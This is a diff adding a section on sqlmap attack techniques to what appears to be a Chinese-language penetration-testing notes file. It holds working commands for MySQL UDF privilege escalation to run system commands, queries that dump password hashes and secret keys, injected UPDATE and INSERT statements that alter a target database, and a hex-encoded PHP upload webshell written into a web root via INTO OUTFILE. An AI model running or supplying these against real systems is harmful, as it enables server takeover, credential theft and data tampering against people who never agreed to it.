@@ -1455,3 +1455,86 @@ init:stop().  //退出Erlang Shell是使用init:stop函数完成的
 + https://github.com/BishopFox/sliver/wiki/Stagers
 + https://lowery.tech/building-a-custom-shellcode-stager-with-process-injection-to-bypass-windows-defender/
 + https://mrd0x.com/download-and-execute-sliver-stager/
+
+## sqlmap常见问题
+### sqlmap自带shell、udf解码
+
+sqlmap中自带的shell以及一些二进制文件不能直接使用的，为防止被误杀都经过异或方式编码的（所幸sqlmap自带解码工具）
+```
+sqlmap/extra/cloak	//sqlmap安装目录/extra/cloak下
+
+Usage: ./cloak.py [-d] -i <input file> [-o <output file>]
+
+Options:
+  --version      show program's version number and exit
+  -h, --help     show this help message and exit
+  -d             Decrypt
+  -i INPUTFILE   Input file
+  -o OUTPUTFILE  Output file
+```
+### sqlmap添加额为的header文件
+```
+sqlmap --headers="Host:www.baidu.com\nUser-Agent:baidu.com"
+```
+### sqlmap Linux MySQL Udf 提权
+
+```
+pip install PyMySQL	//-d 参数所需依赖
+
+sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --sql-shell	//连接数据库执行sql语句,查询数据库插件路径
+
+show variables like "%plugin%"; 或 select @@plugin_dir;
+
+sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --file-write=/lib_mysqludf_sys.so --file-dest=/usr/lib/mysql/plugin/	//上传lib_mysqludf_sys.so到MySQL插件目录
+
+sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" --sql-shell	//激活存储过程「sys_exec」函数，执行系统命令
+
+CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+ 
+SELECT * FROM information_schema.routines
+ 
+sys_exec(id);
+```
+### sqlmap mysql数据库--sql-shell查询语句
+```
+SELECT @@VERSION;	//查看msyql版本
+SELECT @@hostname;	//查看数据库主机名
+SELECT user,password,host FROM mysql.user;	//查看数据库用户密码和连接地址
+SELECT schema_name FROM information_schema.schemata;	//查看数据库
+SELECT * from mysql.user where user = substring_index(user(), '@', 1) ;	//查询当前数据库用户权限
+SELECT id,name,password,secret_key from admin_db.user_xxxx where is_delete = 0;	//指定条件查询数据
+SELECT table_schema,COUNT(table_name) FROM information_schema.TABLES GROUP BY table_schema	//统计所有库下的表个数
+SELECT table_schema,GROUP_CONCAT(table_name) FROM  information_schema.tables GROUP BY table_schema;	//查询整个数据库中所有库和所对应的表信息
+```
+### sqlmap mysql数据库--sql-query查询语句
+```
+sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "select id,name,password,secret_key from admin_db.user_xxxx where is_delete = 0" -o	//指定条件查询数据select 字段 from 数据库名.表名 where 判断 = 条件
+sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "UPDATE admin_db.user_xxxx SET is_delete=0 WHERE id=3" -o	//UPDATE 数据库名.表名 SET 字段名=值 WHERE 判断=条件
+sqlmap -u "https://x.x.x.x/index.php?id=1" --sql-query "INSERT INTO admin_db.admin_xxxx_ip (ip,memo,time,operator) VALUES('127.0.0.1', '365',1554515620,943)"	//插入新数据
+
+```
+### sqlmap sqlserver数据库--sql-shell查询语句
+```
+SELECT name FROM master..sysdatabases	//查询数据库
+SELECT name FROM master..sysobjects WHERE xtype='U'	//查询表明
+SELECT Name FROM SysColumns Where id=Object_Id('TableName')	//获取字段名
+SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename'	//查字段名
+SELECT TOP 1 * FROM 数据库..表名	//查看数据库中表的一条记录
+```
+### sqlmap中转注入WebSocket
+WebSocket定义了两种URI格式, “ws://“和“wss://”，类似于HTTP和HTTPS, “ws://“使用明文传输，默认端口为80，”wss://“使用TLS加密传输，默认端口为443
+```
+python ws-harness.py -h	//帮助
+python ws-harness.py -u ws://dvws.local:8080/authenticate-user-prepared -m a.txt	//-u 远程websocket地址 -m 包含WebSocket消息模板的文件，把[FUZZ]放在需要注入的注入点
+python sqlmap.py -u "http://localhost:8000/?fuzz=test" --dbs --tamper base64encode.py	//DVWS模拟websocket注入
+```
+### --sql-shell 写马
+知道网站路径后需要将上传脚本转换为十六进制
+```
+<form enctype="multipart/form-data" action="upload.php" method="POST"><input name="uploadedfile" type="file"/><input type="submit" value="Upload File"/></form> <?php $target_path=basename($_FILES['uploadedfile']['name']);if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)){echo basename($_FILES['uploadedfile']['name'])." has been uploaded";}else{echo "Error!";}?>
+```
+现在让我们用sqlmap启动--sql-shell并注入
+```
+SELECT 0x3c666f726d20656e63747970653d226d756c7469706172742f666f726d2d646174612220616374696f6e3d2275706c6f61642e70687022206d6574686f643d22504f5354223e3c696e707574206e616d653d2275706c6f6164656466696c652220747970653d2266696c65222f3e3c696e70757420747970653d227375626d6974222076616c75653d2255706c6f61642046696c65222f3e3c2f666f726d3e0d0a3c3f70687020247461726765745f706174683d626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d293b6966286d6f76655f75706c6f616465645f66696c6528245f46494c45535b2775706c6f6164656466696c65275d5b27746d705f6e616d65275d2c247461726765745f7061746829297b6563686f20626173656e616d6528245f46494c45535b2775706c6f6164656466696c65275d5b276e616d65275d292e2220686173206265656e2075706c6f61646564223b7d656c73657b6563686f20224572726f7221223b7d3f3e INTO OUTFILE "/home/relax/public_html/upload.php";
+```
+几秒钟后，如果成功，您应该得到确认http://x.x.x.x/upload.php
